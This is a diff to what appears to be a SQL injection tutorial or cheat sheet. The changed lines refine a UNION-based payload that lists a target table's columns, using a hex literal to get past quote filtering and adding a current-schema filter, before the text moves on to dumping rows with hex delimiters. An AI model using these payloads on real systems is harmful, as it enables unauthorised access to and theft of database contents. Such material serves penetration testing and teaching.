@@ -28,8 +28,10 @@ List the tables in the current database:
 List the columns of a target table. Quoting the table name is often filtered, so pass it as a hex literal (`users` is `0x7573657273`), which needs no quotes:
 
 ```sql
-' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name=0x7573657273-- 
+' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name=0x7573657273 AND table_schema=database()-- 
 ```
+
+The `table_schema=database()` filter matters: without it, a `users` table in several visible schemas would merge their columns together, and names from another schema may not exist on the table in the current database.
 
 Dump the rows. Separate fields with a hex delimiter so the concatenated output stays readable, for example `0x3a` for a colon:
 
